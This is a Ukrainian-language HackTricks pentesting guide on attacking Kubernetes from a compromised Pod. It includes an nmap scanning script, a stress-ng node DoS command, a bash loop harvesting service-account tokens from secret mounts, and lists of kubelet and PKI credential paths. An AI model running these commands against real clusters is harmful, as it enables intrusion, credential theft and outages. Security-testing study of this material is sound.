# –ê—Ç–∞–∫–∞ –Ω–∞ Kubernetes –∑—Å–µ—Ä–µ–¥–∏–Ω–∏ Pod

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**–®–∫–æ–ª–∞ —Ö–∞–∫—ñ–Ω–≥—É HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**–®–∫–æ–ª–∞ —Ö–∞–∫—ñ–Ω–≥—É HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

## **–í—Ç–µ—á–∞ –∑ Pod**

**–Ø–∫—â–æ –≤–∏ –º–∞—î—Ç–µ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ —â–∞—Å—Ç—è, –≤–∏ –º–æ–∂–µ—Ç–µ –≤—Ç–µ–∫—Ç–∏ –∑ –Ω—å–æ–≥–æ –Ω–∞ –≤—É–∑–æ–ª:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### –í—Ç–µ—á–∞ –∑ Pod

–î–ª—è —Å–ø—Ä–æ–±–∏ –≤—Ç–µ—á—ñ –∑ Pod –≤–∞–º –º–æ–∂–µ –∑–Ω–∞–¥–æ–±–∏—Ç–∏—Å—è **–ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤** —Å–ø–æ—á–∞—Ç–∫—É, –¥–µ—è–∫—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ –¥–ª—è —Ü—å–æ–≥–æ:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Ü—ñ **–≤—Ç–µ—á—ñ –∑ Docker, —â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤—Ç–µ–∫—Ç–∏** –∑ –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –≤–∞–º–∏ Pod:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ Kubernetes

–Ø–∫ –ø–æ—è—Å–Ω–µ–Ω–æ –≤ —Ä–æ–∑–¥—ñ–ª—ñ –ø—Ä–æ **–ø–µ—Ä–µ–ª—ñ–∫ Kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

–ó–∞–∑–≤–∏—á–∞–π Pod –∑–∞–ø—É—Å–∫–∞—é—Ç—å—Å—è –∑ **—Ç–æ–∫–µ–Ω–æ–º –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω–∏—Ö**. –¶–µ–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –º–æ–∂–µ –º–∞—Ç–∏ –¥–µ—è–∫—ñ **–ø—Ä–∏–≤—ñ–ª–µ—ó**, —è–∫—ñ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏**, —â–æ–± **–ø–µ—Ä–µ–π—Ç–∏** –¥–æ —ñ–Ω—à–∏—Ö Pod –∞–±–æ –Ω–∞–≤—ñ—Ç—å **–≤—Ç–µ–∫—Ç–∏** –Ω–∞ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –≤—É–∑–ª–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —è–∫ —Ü–µ —Ä–æ–±–∏—Ç–∏:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ Cloud

–Ø–∫—â–æ Pod –∑–∞–ø—É—â–µ–Ω–æ –≤ **—Ö–º–∞—Ä–Ω–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ**, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏—Ç—ñ–∫–∞—Ç–∏ —Ç–æ–∫–µ–Ω –∑ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö** —Ç–∞ –ø—ñ–¥–≤–∏—â—É–≤–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –π–æ–≥–æ.

## –ü–æ—à—É–∫ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –º–µ—Ä–µ–∂–µ–≤–∏—Ö —Å–ª—É–∂–±

–û—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ Kubernetes, —è–∫—â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –ø–æ—Ç–æ—á–Ω–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ Pod, —ñ –Ω–µ –º–æ–∂–µ—Ç–µ –≤—Ç–µ–∫—Ç–∏ –∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞, –≤–∞–º —Å–ª—ñ–¥ **—à—É–∫–∞—Ç–∏ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –≤—Ä–∞–∑–ª–∏–≤—ñ —Å–ª—É–∂–±–∏**.

### –°–ª—É–∂–±–∏

**–î–ª—è —Ü—ñ—î—ó –º–µ—Ç–∏ –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤—Å—ñ —Å–ª—É–∂–±–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ Kubernetes:**
```
kubectl get svc --all-namespaces
```
–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º Kubernetes –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø–ª–æ—Å–∫—É —Å—Ö–µ–º—É –º–µ—Ä–µ–∂—ñ, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ **–±—É–¥—å-—è–∫–∏–π pod/service –≤ –º–µ–∂–∞—Ö –∫–ª–∞—Å—Ç–µ—Ä–∞ –º–æ–∂–µ —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ —ñ–Ω—à–∏–º–∏**. **–ü—Ä–æ—Å—Ç–æ—Ä–∏ —ñ–º–µ–Ω** –≤ –º–µ–∂–∞—Ö –∫–ª–∞—Å—Ç–µ—Ä–∞ **–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–µ –º–∞—é—Ç—å –æ–±–º–µ–∂–µ–Ω—å –º–µ—Ä–µ–∂–µ–≤–æ—ó –±–µ–∑–ø–µ–∫–∏**. –ë—É–¥—å-—Ö—Ç–æ –≤ –ø—Ä–æ—Å—Ç–æ—Ä—ñ —ñ–º–µ–Ω –º–æ–∂–µ —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ —ñ–Ω—à–∏–º–∏ –ø—Ä–æ—Å—Ç–æ—Ä–∞–º–∏ —ñ–º–µ–Ω.

### –°–∫–∞–Ω—É–≤–∞–Ω–Ω—è

–ù–∞—Å—Ç—É–ø–Ω–∏–π —Å—Ü–µ–Ω–∞—Ä—ñ–π Bash (–≤–∑—è—Ç–∏–π –∑ [—Å–µ–º—ñ–Ω–∞—Ä—É –∑ Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ç–∞ –ø—Ä–æ—Å–∫–∞–Ω—É—î IP-–¥—ñ–∞–ø–∞–∑–æ–Ω–∏ –∫–ª–∞—Å—Ç–µ—Ä–∞ Kubernetes:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–¥—ñ–π—Å–Ω–∏—Ç–∏ –∞—Ç–∞–∫—É –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ —Å–ª—É–∂–±–∏ Kubernetes**, —â–æ–± **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —ñ–Ω—à—ñ –∫–∞–ø—Å—É–ª–∏/–≤–µ—Å—å —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### –ü—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è

–£ –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ **–∫–æ–º–ø—Ä–æ–º—ñ—Ç–æ–≤–∞–Ω–∞ –∫–∞–ø—Å—É–ª–∞ –∑–∞–ø—É—Å–∫–∞—î –¥–µ—è–∫—É —á—É—Ç–ª–∏–≤—É —Å–ª—É–∂–±—É**, –¥–µ —ñ–Ω—à–∏–º –∫–∞–ø—Å—É–ª–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–∞–Ω—ñ –¥–ª—è –≤—Ö–æ–¥—É, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω—ñ –∑ —ñ–Ω—à–∏—Ö –∫–∞–ø—Å—É–ª, **–ø—Ä–æ—Å–ª—É—Ö–æ–≤—É—é—á–∏ –ª–æ–∫–∞–ª—å–Ω—ñ –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó**.

## –ü—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è –º–µ—Ä–µ–∂—ñ

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ç–∞–∫—ñ —Ç–µ—Ö–Ω—ñ–∫–∏, —è–∫ **–ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è ARP** (—ñ –∑–∞–≤–¥—è–∫–∏ —Ü—å–æ–º—É **–ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è DNS**), –ø—Ä–∞—Ü—é—é—Ç—å –≤ –º–µ—Ä–µ–∂—ñ Kubernetes. –ü–æ—Ç—ñ–º, –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–∞–ø—Å—É–ª–∏, —è–∫—â–æ —É –≤–∞—Å —î **–º–æ–∂–ª–∏–≤—ñ—Å—Ç—å NET\_RAW** (—è–∫–∞ —Ç–∞–º –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º), –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ –≤–ª–∞—Å–Ω–æ—Ä—É—á —Å—Ç–≤–æ—Ä–µ–Ω—ñ –º–µ—Ä–µ–∂–µ–≤—ñ –ø–∞–∫–µ—Ç–∏ —Ç–∞ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ **–∞—Ç–∞–∫–∏ —Ç–∏–ø—É MitM —á–µ—Ä–µ–∑ –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è ARP –Ω–∞ –≤—Å—ñ –∫–∞–ø—Å—É–ª–∏, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ —Ç–æ–º—É –∂ –≤—É–∑–ª—ñ**.\
–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ **–∑–ª–æ–≤–º–∏—Å–Ω–∞ –∫–∞–ø—Å—É–ª–∞** –ø—Ä–∞—Ü—é—î –Ω–∞ **—Ç–æ–º—É –∂ –≤—É–∑–ª—ñ, —â–æ —ñ DNS-—Å–µ—Ä–≤–µ—Ä**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ **–∞—Ç–∞–∫—É –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è DNS –Ω–∞ –≤—Å—ñ –∫–∞–ø—Å—É–ª–∏ –≤ –∫–ª–∞—Å—Ç–µ—Ä—ñ**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## DoS –≤—É–∑–ª–∞

–£ –º–∞–Ω—ñ—Ñ–µ—Å—Ç–∞—Ö Kubernetes –Ω–µ –≤–∫–∞–∑–∞–Ω–æ —Ä–µ—Å—É—Ä—Å—ñ–≤ —Ç–∞ **–Ω–µ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω–æ –æ–±–º–µ–∂–µ–Ω—å** –¥–ª—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤. –Ø–∫ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫, –º–∏ –º–æ–∂–µ–º–æ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤—Å—ñ —Ä–µ—Å—É—Ä—Å–∏, –¥–µ –ø—Ä–∞—Ü—é—î –∫–∞–ø—Å—É–ª–∞/—Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è**, —ñ –≤–∏—á–µ—Ä–ø–∞—Ç–∏ —ñ–Ω—à—ñ —Ä–µ—Å—É—Ä—Å–∏, —Å–ø—Ä–∏—á–∏–Ω–∏–≤—à–∏ DoS –¥–ª—è —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞.

–¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–∞–∫–æ–≥–æ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É, —è–∫ [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
–í–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Ä—ñ–∑–Ω–∏—Ü—é –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è `stress-ng` —ñ –ø—ñ—Å–ª—è.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## –ü–æ—Å—Ç-–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤—É–∑–ª–∞

–Ø–∫—â–æ –≤–∞–º –≤–¥–∞–ª–æ—Å—è **–≤–∏–π—Ç–∏ –∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞**, –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —Ü—ñ–∫–∞–≤—ñ —Ä–µ—á—ñ –Ω–∞ –≤—É–∑–ª—ñ:

* –ü—Ä–æ—Ü–µ—Å **Container Runtime** (Docker)
* –ë—ñ–ª—å—à–µ **–ø–æ–¥—ñ–≤/–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤**, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ –≤—É–∑–ª—ñ, —è–∫—ñ –º–æ–∂–Ω–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏, —è–∫ —Ü–µ–π (–±—ñ–ª—å—à–µ —Ç–æ–∫–µ–Ω—ñ–≤)
* –í–µ—Å—å **—Ñ–∞–π–ª–æ–≤–∏–π —Å–∏—Å—Ç–µ–º** —Ç–∞ **–û–°** –≤–∑–∞–≥–∞–ª—ñ
* –°–ª—É–∂–±–∞ **Kube-Proxy**, —â–æ –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É—î
* –°–ª—É–∂–±–∞ **Kubelet**, —â–æ –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É—î. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ñ–∞–π–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó:
* –î–∏—Ä–µ–∫—Ç–æ—Ä—ñ—è: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* –Ü–Ω—à—ñ **–∑–∞–≥–∞–ª—å–Ω—ñ —Ñ–∞–π–ª–∏ Kubernetes**:
* `$HOME/.kube/config` - **–ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**
* `/etc/kubernetes/kubelet.conf`- **–ó–≤–∏—á–∞–π–Ω–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **–ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è**
* `/etc/kubernetes/manifests/etcd.yaml` - **–ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è etcd**
* `/etc/kubernetes/pki` - **–ö–ª—é—á Kubernetes**

### –ó–Ω–∞–π–¥—ñ—Ç—å kubeconfig –≤—É–∑–ª–∞

–Ø–∫—â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ñ–∞–π–ª kubeconfig –≤ –æ–¥–Ω–æ–º—É –∑ —Ä–∞–Ω—ñ—à–µ –∑–∞–∑–Ω–∞—á–µ–Ω–∏—Ö —à–ª—è—Ö—ñ–≤, **–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∞—Ä–≥—É–º–µ–Ω—Ç `--kubeconfig` –ø—Ä–æ—Ü–µ—Å—É kubelet**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### –í–∏–∫—Ä–∞–¥–µ–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
–°—Ü–µ–Ω–∞—Ä—ñ–π [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ **–æ—Ç—Ä–∏–º—É—î —Ç–æ–∫–µ–Ω–∏ —ñ–Ω—à–∏—Ö –∫–∞–ø—Å—É–ª —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –º–∞—é—Ç—å –≤–æ–Ω–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏** (–∑–∞–º—ñ—Å—Ç—å —Ç–æ–≥–æ, —â–æ–± –≤–∏ –ø–µ—Ä–µ–≤—ñ—Ä—è–ª–∏ —ó—Ö –ø–æ –æ–¥–Ω–æ–º—É):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### –ü—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ DaemonSets

DaemonSet - —Ü–µ **–ø–æ–¥**, —è–∫–∏–π –±—É–¥–µ **–∑–∞–ø—É—â–µ–Ω–∏–π** –Ω–∞ **–≤—Å—ñ—Ö –≤—É–∑–ª–∞—Ö –∫–ª–∞—Å—Ç–µ—Ä–∞**. –¢–æ–º—É, —è–∫—â–æ DaemonSet –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –∑ **–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–º –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º —Å–µ—Ä–≤—ñ—Å—É**, –Ω–∞ **–í–°–Ü–• –≤—É–∑–ª–∞—Ö** –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **—Ç–æ–∫–µ–Ω** —Ü—å–æ–≥–æ **–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É**, —è–∫–∏–º –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏.

–ï–∫—Å–ø–ª–æ–π—Ç —Ç–∞–∫–∏–π —Å–∞–º–∏–π, —è–∫ —É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, –∞–ª–µ —Ç–µ–ø–µ—Ä –≤–∏ –Ω–µ –∑–∞–ª–µ–∂–∏—Ç–µ –≤—ñ–¥ —É–¥–∞—á—ñ.

### –ü–µ—Ä–µ—Ö—ñ–¥ –¥–æ —Ö–º–∞—Ä–∏

–Ø–∫—â–æ –∫–ª–∞—Å—Ç–µ—Ä –∫–µ—Ä—É—î—Ç—å—Å—è —Ö–º–∞—Ä–Ω–∏–º —Å–µ—Ä–≤—ñ—Å–æ–º, –∑–∞–∑–≤–∏—á–∞–π **–í—É–∑–æ–ª –º–∞—Ç–∏–º–µ —ñ–Ω—à–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö** –Ω—ñ–∂ –ü–æ–¥. –¢–æ–º—É —Å–ø—Ä–æ–±—É–π—Ç–µ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö –∑ –≤—É–∑–ª–∞** (–∞–±–æ –∑ –ø–æ–¥—É –∑ hostNetwork –≤ True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### –í–∫—Ä–∞—Å—Ç–∏ etcd

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) –≤—É–∑–ª–∞, –Ω–∞ —è–∫–æ–º—É –±—É–¥–µ –∑–∞–ø—É—â–µ–Ω–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä, –æ—Ç—Ä–∏–º–∞–π—Ç–µ –æ–±–æ–ª–æ–Ω–∫—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –≤—É–∑–ª–∞ –∫–µ—Ä—É–≤–∞–Ω–Ω—è —Ç–∞ –æ—Ç—Ä–∏–º–∞–π—Ç–µ **–±–∞–∑—É –¥–∞–Ω–∏—Ö etcd**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane –≤—É–∑–ª–∏ –º–∞—é—Ç—å **—Ä–æ–ª—å –º–∞–π—Å—Ç—Ä–∞** —ñ –≤ **–∫–ª–∞—Å—Ç–µ—Ä–∞—Ö, –∫–µ—Ä–æ–≤–∞–Ω–∏—Ö —Ö–º–∞—Ä–æ—é, –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –∑–∞–ø—É—Å–∫–∞—Ç–∏ –Ω–∞ –Ω–∏—Ö –Ω—ñ—á–æ–≥–æ**.

#### –ß–∏—Ç–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤ –∑ etcd

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Å–≤—ñ–π –ø–æ–¥ –Ω–∞ –≤—É–∑–ª—ñ control-plane, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–µ–ª–µ–∫—Ç–æ—Ä `nodeName` –≤ —Å–ø–µ—Ü–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –ø–æ–¥–∞, –≤–∏ –º–æ–∂–µ—Ç–µ –ª–µ–≥–∫–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö `etcd`, —è–∫–∞ –º—ñ—Å—Ç–∏—Ç—å –≤—Å—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –∫–ª–∞—Å—Ç–µ—Ä–∞, –≤–∫–ª—é—á–∞—é—á–∏ –≤—Å—ñ —Å–µ–∫—Ä–µ—Ç–∏.

